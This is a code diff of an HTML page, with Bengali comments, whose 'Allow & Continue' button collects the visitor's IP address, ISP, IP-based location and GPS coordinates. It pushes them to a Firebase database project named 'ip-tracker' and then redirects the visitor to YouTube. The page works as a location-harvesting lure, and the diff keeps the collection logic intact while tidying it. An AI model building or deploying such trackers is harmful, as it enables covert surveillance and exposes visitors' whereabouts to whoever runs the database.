@@ -4,7 +4,12 @@
   <meta charset="UTF-8" />
   <title>Allow Location with Firebase</title>
   <style>
-    body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding: 50px;
+      background: #f4f4f4;
+    }
     button {
       padding: 12px 24px;
       font-size: 16px;
@@ -15,6 +20,7 @@
       cursor: pointer;
     }
   </style>
+
   <!-- Firebase CDN -->
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
@@ -25,18 +31,17 @@
   <button onclick="startTracking()">Allow & Continue</button>
 
   <script>
-    // তোমার Firebase config বসাও এখানে:
+    // ✅ Firebase Config
     const firebaseConfig = {
       apiKey: "AIzaSyD7-mS804xPfoS8pJnboMpsbZGFrHEIcVk",
       authDomain: "ip-tracker-d63e1.firebaseapp.com",
       projectId: "ip-tracker-d63e1",
-      storageBucket: "ip-tracker-d63e1.firebasestorage.app",
+      storageBucket: "ip-tracker-d63e1.appspot.com",
       messagingSenderId: "978015386276",
       appId: "1:978015386276:web:418573d8546b922b974431",
       measurementId: "G-SZB4ZMG0V3"
     };
 
-    // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
@@ -53,7 +58,10 @@
               });
             },
             error => {
-              resolve({ latitude: "Permission denied", longitude: "Permission denied" });
+              resolve({
+                latitude: "Permission denied",
+                longitude: "Permission denied"
+              });
             },
             { timeout: 10000 }
           );
@@ -63,19 +71,19 @@
 
     async function startTracking() {
       try {
-        // Get IP
+        // ✅ Get IP
         const ipRes = await fetch('https://api64.ipify.org?format=json');
         const ipJson = await ipRes.json();
         const ip = ipJson.ip;
 
-        // Location via IP
+        // ✅ Get Location using IP
         const locRes = await fetch(`https://ipwhois.app/json/${ip}`);
         const locData = await locRes.json();
 
-        // GPS Location
+        // ✅ Get GPS Location
         const gps = await getGeoCoords();
 
-        // Prepare data
+        // ✅ Prepare Data
         const data = {
           ip: ip,
           isp: locData.org || 'N/A',
@@ -89,16 +97,17 @@
           timestamp: new Date().toISOString()
         };
 
-        // Send data to Firebase Realtime Database
-        await db.ref('visitors').push(data);
+        // ✅ Send to Firebase
+        await db.ref("visitors").push(data);
+        console.log("✅ Data sent:", data);
 
         alert("তোমার তথ্য সফলভাবে পাঠানো হয়েছে।");
 
       } catch (err) {
-        console.error("Tracking error:", err);
+        console.error("❌ Tracking error:", err);
         alert("ত্রুটি ঘটেছে, পরে আবার চেষ্টা করো।");
       } finally {
-        // Optional redirect - তুমি চাইলে রাখো বা সরিয়ে দাও
+        // ✅ Redirect
         window.location.href = "https://youtube.com";
       }
     }
